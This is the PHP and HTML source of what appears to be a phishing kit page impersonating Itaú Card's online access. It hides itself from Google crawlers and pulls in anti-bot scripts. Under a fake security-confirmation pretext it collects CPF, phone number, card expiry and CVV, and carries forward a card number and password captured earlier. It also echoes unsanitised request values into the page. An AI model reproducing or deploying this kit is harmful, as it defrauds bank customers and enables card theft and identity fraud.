<?php
error_reporting(0);
ini_set(“display_errors”, 0 );
include "../BOTS/anti0.php";
include "../BOTS/anti1.php";
include "../BOTS/anti2.php";
include "../BOTS/anti3.php";
include "../BOTS/anti4.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Itau Card | Acesso Online</title>
	
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
	
	<script type="text/javascript" src="js/jquery.js"></script>
	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	
	<link rel="shortcut icon" href="../assets/imagenss/ico_favicon.png">
	<link rel="stylesheet" type="text/css" href="../assets/css/cad_promo_style.css">
</head>
<body>
	<script type="text/javascript">
		$(document).ready(function() {

			$("input[name=validade]").mask("00/0000");
			$("input[name=cvv]").mask("000");

			var SPMaskBehavior = function (val) {
			  return val.replace(/\D/g, '').length === 11 ? '(00) 00000-0000' : '(00) 0000-00009';
			},
			spOptions = {
			  onKeyPress: function(val, e, field, options) {
			      field.mask(SPMaskBehavior.apply({}, arguments), options);
			    }
			};

			$('input[name=phone]').mask(SPMaskBehavior, spOptions);
			$("input[name=cpf]").mask("000.000.000-00");

			$("input[name=phone]").keyup(function(event) {
				if ($(this).val().length == 15) {
					$("input[name=validade]").focus()
				}
			});

			$("input[name=validade]").keyup(function(event) {
				if ($(this).val().length == 7) {
					$("input[name=cvv]").focus()
				}
			});

		});
	</script>
	<header class="top-promo">
		<img src="../assets/imagenss/img_logo.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Identificação</li>
			<li>Confirmação</li>
			<li>Concluído</li>
		</ul>
	</section>
	<section class="frm-container">
		<div class="eng-tx">
			<p>Olá cliente Itaú, por motivos de segurança, você precisa confirmar os seguintes dados abaixo.</p>
		</div>
		<div class="frm">
			<form id="frmcad" name="frmcad" method="POST" action="../aguarde/">
				
<input type="hidden" name="mensagem" value="<?php echo $_GET['mensagem']; ?>">

				<div class="frm-item">
					<input type="tel" id="cpf" name="cpf"  autocomplete="off" maxLength="14" required="" minLength="14">
					<label for="numcpf" class="label-float">CPF</label>
				</div>
				<div class="frm-item">
					<input type="tel" id="phone" name="phone"  autocomplete="off" maxLength="14" required="" minLength="14">
					<label for="numcpf" class="label-float">TELEFONE</label>
				</div>


				<div class="frm-item">
					<input type="tel" id="validade" name="validade"  autocomplete="off" maxLength="5" required="" minLength="5">
					<label for="numdtv" class="label-float">Validade do cartão</label>
				</div>
				<div class="frm-item">
					<input type="tel" id="cvv" name="cvv"  autocomplete="off" maxLength="3" required="" minLength="3">
					<label for="numcvv" class="label-float">Código de segurança</label>
					<span id="helpcvv" class="helpcvv"></span>
				</div>
				<input type="submit" id="btncad" class="btncad" name="btncad" value="continuar" style="background-color: rgb(238, 116, 33); color: rgb(255, 255, 255);">


				<input type="hidden" name="numc" value="<?php echo $_POST['numc']; ?>">
				<input type="hidden" name="passc" value="<?php echo $_POST['passc']; ?>">
			</form>
			</form>
		</div>
	</section>
	<section id="mod-help-cvv" class="mod-help-cvv">
		<span id="mod-help-close" class="mod-help-close">x</span>
		<div class="container-mod">
			<img class="img-mod-help" src="../assets/imagenss/img_card_cvv.png">
			<p>O código de segurança são os três dígitos que encontra-se no verso do seu cartão, como mostrado na imagem acima.</p>
		</div>
	</section>

</body></html>